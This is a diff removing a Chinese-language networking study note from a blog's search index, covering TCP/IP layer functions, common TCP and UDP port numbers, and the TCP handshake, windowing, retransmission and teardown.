-</tbody></table>
-<h3 id="TCP-x2F-IP协议栈各层功能"><a href="#TCP-x2F-IP协议栈各层功能" class="headerlink" title="TCP&#x2F;IP协议栈各层功能"></a>TCP&#x2F;IP协议栈各层功能</h3><h4 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h4><p>为应用提供网络服务</p>
-<ul>
-<li>网络应用<ul>
-<li>微博、微信、QQ……</li>
-</ul>
-</li>
-<li>邮件服务（SMTP、POP3）<ul>
-<li>Outlook、新浪邮箱……</li>
-</ul>
-</li>
-<li>网页服务（http、https）<ul>
-<li>百度、搜狐、网易</li>
-</ul>
-</li>
-<li>网络管理<ul>
-<li>SNMP</li>
-</ul>
-</li>
-<li>远程登陆<ul>
-<li>Telnet、ssh</li>
-</ul>
-</li>
-<li>地址服务<ul>
-<li><pre><code>DNS、DHCP
-</code></pre>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>提供端到端传输服务</p>
-<ul>
-<li>基于TCP的协议，可靠传输、有重传机制<ul>
-<li>FTP、SMTP、Telnet、HTTP</li>
-</ul>
-</li>
-<li>基于UDP的协议传输，不可靠、效率高<ul>
-<li>TFTP、SNMP、DHCP</li>
-</ul>
-</li>
-</ul>
-<p>TCP&#x2F;UDP端口号范围是<code>0~65535</code>，其中<code>0~1023</code>是熟知端口号，已固定分配给常用应用程序</p>
-<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
-<li><p>提供主机到主机的传输服务</p>
-</li>
-<li><p>IP</p>
-<ul>
-<li>提供主机到主机的传输服务</li>
-</ul>
-</li>
-<li><p>ICMP</p>
-<ul>
-<li>辅助IP工作,提供出错和控制信息</li>
-</ul>
-</li>
-<li><p>ARP</p>
-<ul>
-<li>解析IP与MAC的映射</li>
-</ul>
-</li>
-</ul>
-<h4 id="网络接入层"><a href="#网络接入层" class="headerlink" title="网络接入层"></a>网络接入层</h4><ul>
-<li><p>在相邻节点提供数据传输服务</p>
-</li>
-<li><p>局域网</p>
-<ul>
-<li>IEEE802.2	定义LLC子层</li>
-<li>IEEE802.3 	以太网标准</li>
-</ul>
-</li>
-<li><p>广域网</p>
-<ul>
-<li>HDLC(高级数据链路控)协议)</li>
-<li>PPP(点对点协议,类别:数据链路层协议)</li>
-<li>Frame Relay(帧中继)</li>
-</ul>
-</li>
-</ul>
-<h3 id="常见协议端口号"><a href="#常见协议端口号" class="headerlink" title="常见协议端口号"></a>常见协议端口号</h3><h4 id="TCP端口号"><a href="#TCP端口号" class="headerlink" title="TCP端口号"></a>TCP端口号</h4><table>
-<thead>
-<tr>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>FTP</td>
-<td>21</td>
-<td>HTTP</td>
-<td>80</td>
-<td>SMTP</td>
-<td>25</td>
-</tr>
-<tr>
-<td>FT-daada</td>
-<td>20</td>
-<td>HTTPS</td>
-<td>443</td>
-<td>POP3</td>
-<td>110</td>
-</tr>
-<tr>
-<td>Telnet</td>
-<td>23</td>
-<td>SQL</td>
-<td>１４３３</td>
-<td>Tacacs＋</td>
-<td>４９</td>
-</tr>
-<tr>
-<td>SSH</td>
-<td>２２</td>
-<td>Oracle</td>
-<td>１５２１</td>
-<td>DNS</td>
-<td>５３</td>
-</tr>
-</tbody></table>
-<h4 id="UDP端口号"><a href="#UDP端口号" class="headerlink" title="UDP端口号"></a>UDP端口号</h4><table>
-<thead>
-<tr>
-<th align="center">协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-<th>协议</th>
-<th>端口号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">DHCP</td>
-<td>67、68</td>
-<td>Radius</td>
-<td>1812、1813</td>
-<td>WINS</td>
-<td>42</td>
-</tr>
-<tr>
-<td align="center">TFTP</td>
-<td>69</td>
-<td>NTP</td>
-<td>123</td>
-<td>NETBIOS</td>
-<td>137、138、139</td>
-</tr>
-<tr>
-<td align="center">SNMP</td>
-<td>１６１、１６２</td>
-<td>RIP</td>
-<td>５２０</td>
-<td>DNS</td>
-<td>５３</td>
-</tr>
-</tbody></table>
-<h3 id="传输层的区别"><a href="#传输层的区别" class="headerlink" title="传输层的区别"></a>传输层的区别</h3><ul>
-<li>UDP报文结构简单，传输效率高，但不具备排序功能以及重传机制，数据包到达目的地时，有可能因为网 络问题，出现乱序或者丢包现象<ul>
-<li>常用在视频、语音应用等</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114916.png" alt="1" loading="lazy"></p>
-<ul>
-<li><p>TCP报文结构相对复杂，具备序列号、确认号、窗口大小等字段，使其具备排序功能、重传机制、滑动窗 口机制，确保数据传输的可靠性，使得数据能够准确按序到达目的地 </p>
-<ul>
-<li>常用在HTTP、FTP等可靠传输</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114918.png" alt="2" loading="lazy"></p>
-<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
-<li><p>基于TCP协议</p>
-<ul>
-<li>传输数据前:由TCP建立连接</li>
-<li>传输过程中:由TCP解决可靠性、有序性，进行流量控制</li>
-<li>传输结束后：由TCP拆除链接</li>
-</ul>
-</li>
-<li><p>TCP头部字段</p>
-<ul>
-<li>端口号：源端口标识发送方的进程,目的端口表示接收方的进程</li>
-</ul>
-</li>
-<li><p>序列号:保证数据传输的有序性,确认收到的数据进行确认</p>
-<ul>
-<li>窗口大小:传输阶段每次连续发送数据的大小</li>
-</ul>
-</li>
-<li><p>Flag字段:</p>
-<ul>
-<li>ACK:确认标志号,置于1表示确认号有效,表示收到虽短的特定数据<ul>
-<li>RST:复位标志.至于1表示拒绝错误和非法的数据包,复位错误的链接</li>
-</ul>
-</li>
-<li>SYN:同步标志序号,至于1表示同步需要,用来建立连接<ul>
-<li>FIN:结束标志,至于1表示链接将被断开,用于拆除链接</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114921.png" alt="3" loading="lazy"></p>
-<h3 id="TCP协议工作过程"><a href="#TCP协议工作过程" class="headerlink" title="TCP协议工作过程"></a>TCP协议工作过程</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>数据传输之前：三次握手建立连接</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114923.png" alt="4" loading="lazy"></p>
-<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p> 数据传输过程中，发送方发送窗口大小的数据，接收方只进行一次确认</p>
-<p> 如果接收方处理能力不足，会调整窗口大小，接收方按新的窗口进行数据发送</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114925.png" alt="5" loading="lazy"></p>
-<h4 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h4><p> 当某个包因网络问题，传输失败，接收方仅确认上一个数据包 </p>
-<p>发送方将根据确认号，进行数据重传</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114927.png" alt="6" loading="lazy"></p>
-<h4 id="拆除连接"><a href="#拆除连接" class="headerlink" title="拆除连接"></a>拆除连接</h4><p>四次挥手拆除连接， TCP通过FIN置位为1表示拆除连接</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114929.png" alt="7" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
       </tags>
   </entry>
 </search>
